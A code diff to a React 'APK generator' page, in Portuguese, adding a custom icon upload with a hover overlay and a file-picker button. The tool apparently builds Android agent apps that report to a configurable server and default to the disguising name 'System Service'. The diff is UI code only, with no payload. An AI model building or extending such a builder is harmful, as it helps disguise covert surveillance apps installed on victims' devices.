@@ -1,6 +1,8 @@
 import { useState, useRef, useCallback } from "react";
 import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";
 
+const DEFAULT_ICON = "/zeus-logo.jpeg";
+
 const G = "#00ff88";
 
 // Defined OUTSIDE the page component so React never recreates them on re-render
@@ -121,6 +123,9 @@ export default function ApkGenerator() {
   const [log, setLog] = useState<string[]>([]);
   const [done, setDone] = useState(false);
   const [builtPkg, setBuiltPkg] = useState("");
+  const [iconSrc, setIconSrc] = useState(DEFAULT_ICON);
+  const [iconFileName, setIconFileName] = useState("zeus-logo.jpeg");
+  const [iconHover, setIconHover] = useState(false);
 
   // Uncontrolled refs for text inputs — no re-render on every keystroke
   const appNameRef = useRef<HTMLInputElement>(null);
@@ -128,10 +133,24 @@ export default function ApkGenerator() {
   const serverUrlRef = useRef<HTMLInputElement>(null);
   const iconNameRef = useRef<HTMLInputElement>(null);
   const logBottomRef = useRef<HTMLDivElement>(null);
+  const fileInputRef = useRef<HTMLInputElement>(null);
 
   const toggle = useCallback((key: keyof BoolConfig) => {
     setBools((prev) => ({ ...prev, [key]: !prev[key] }));
   }, []);
+
+  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    setIconFileName(file.name);
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      setIconSrc(ev.target?.result as string);
+    };
+    reader.readAsDataURL(file);
+    // Reset so same file can be selected again
+    e.target.value = "";
+  };
 
   const handleBuild = async () => {
     const appName = appNameRef.current?.value || "System Service";
@@ -205,46 +224,94 @@ export default function ApkGenerator() {
         {/* LEFT — Config */}
         <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
 
-          {/* APK Icon preview */}
+          {/* APK Icon upload */}
           <Panel>
             <PanelHeader>&gt; ÍCONE DO APK</PanelHeader>
-            <div style={{ padding: "12px", display: "flex", alignItems: "center", gap: 16 }}>
+            <div style={{ padding: "14px 12px", display: "flex", alignItems: "center", gap: 16 }}>
+
+              {/* Hidden file input */}
+              <input
+                ref={fileInputRef}
+                type="file"
+                accept="image/*"
+                onChange={handleIconChange}
+                style={{ display: "none" }}
+              />
+
+              {/* Clickable icon preview */}
               <div
+                onClick={() => fileInputRef.current?.click()}
+                onMouseEnter={() => setIconHover(true)}
+                onMouseLeave={() => setIconHover(false)}
                 style={{
-                  width: 64,
-                  height: 64,
-                  borderRadius: 14,
-                  border: `2px solid ${G}`,
+                  width: 72,
+                  height: 72,
+                  borderRadius: 16,
+                  border: `2px solid ${iconHover ? "#fff" : G}`,
                   overflow: "hidden",
                   flexShrink: 0,
-                  boxShadow: `0 0 16px ${G}44`,
+                  boxShadow: iconHover ? `0 0 20px ${G}88` : `0 0 12px ${G}44`,
                   background: "#000",
+                  cursor: "pointer",
+                  position: "relative",
+                  transition: "all 0.15s",
                 }}
               >
                 <img
-                  src="/zeus-logo.jpeg"
+                  src={iconSrc}
                   alt="APK Icon"
-                  style={{ width: "100%", height: "100%", objectFit: "cover" }}
+                  style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
                 />
+                {/* Hover overlay */}
+                {iconHover && (
+                  <div
+                    style={{
+                      position: "absolute",
+                      inset: 0,
+                      background: "rgba(0,0,0,0.65)",
+                      display: "flex",
+                      flexDirection: "column",
+                      alignItems: "center",
+                      justifyContent: "center",
+                      gap: 2,
+                    }}
+                  >
+                    <span style={{ fontSize: 18 }}>🖼</span>
+                    <span style={{ fontSize: 7, color: G, letterSpacing: "0.06em" }}>TROCAR</span>
+                  </div>
+                )}
               </div>
-              <div>
+
+              <div style={{ flex: 1, minWidth: 0 }}>
                 <div style={{ fontSize: 10, color: G, fontWeight: "bold", marginBottom: 4 }}>
-                  Zeus MOB Agent
+                  Ícone do APK
                 </div>
-                <div style={{ fontSize: 8, color: "#445", marginBottom: 6 }}>
-                  Ícone exibido no Android após instalação
+                <div style={{ fontSize: 8, color: "#445", marginBottom: 8, lineHeight: 1.5 }}>
+                  Clique na imagem para escolher qualquer foto da galeria. Esse ícone será exibido no Android após a instalação.
                 </div>
-                <div
+                <button
+                  onClick={() => fileInputRef.current?.click()}
                   style={{
-                    fontSize: 7,
-                    color: "#334",
-                    border: "1px solid #1a3a20",
-                    padding: "3px 8px",
-                    display: "inline-block",
+                    background: "transparent",
+                    border: `1px solid ${G}`,
+                    color: G,
+                    fontSize: 9,
+                    padding: "4px 12px",
+                    cursor: "pointer",
+                    fontFamily: "inherit",
+                    letterSpacing: "0.1em",
+                    fontWeight: "bold",
                   }}
+                  onMouseEnter={(e) => { e.currentTarget.style.background = `${G}22`; }}
+                  onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
                 >
-                  192×192 px · PNG
-                </div>
+                  [ ESCOLHER FOTO ]
+                </button>
+                {iconFileName !== "zeus-logo.jpeg" && (
+                  <div style={{ fontSize: 7, color: "#445", marginTop: 6, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
+                    ✓ {iconFileName}
+                  </div>
+                )}
               </div>
             </div>
           </Panel>
